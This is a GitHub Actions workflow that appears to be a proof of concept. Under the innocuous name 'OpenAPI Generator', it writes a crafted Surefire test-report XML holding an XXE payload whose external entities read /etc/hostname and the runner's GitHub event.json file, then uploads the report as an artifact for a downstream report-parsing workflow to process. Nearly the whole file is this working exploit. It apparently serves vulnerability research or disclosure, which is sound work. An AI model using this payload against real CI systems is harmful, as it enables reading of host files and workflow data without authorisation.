name: OpenAPI Generator

on:
  push:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Craft attacker-controlled surefire report (XXE probe)
        run: |
          mkdir -p out/surefire-reports
          cat > out/surefire-reports/TEST-xxe.xml <<'XML'
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE testsuites [
            <!ENTITY xxe SYSTEM "file:///etc/hostname">
            <!ENTITY xxe2 SYSTEM "file:///home/runner/work/_temp/_github_workflow/event.json">
          ]>
          <testsuites time="1">
            <testsuite name="poc.XXE" tests="1" failures="0" time="1">
              <testcase classname="poc.XXE" name="xxe-&xxe;-END" time="0.1"/>
            </testsuite>
          </testsuites>
          XML
          sed -i 's/^          //' out/surefire-reports/TEST-xxe.xml
          cat out/surefire-reports/TEST-xxe.xml
      - uses: actions/upload-artifact@v4
        with:
          name: surefire-test-results
          path: '**/surefire-reports/TEST-*.xml'
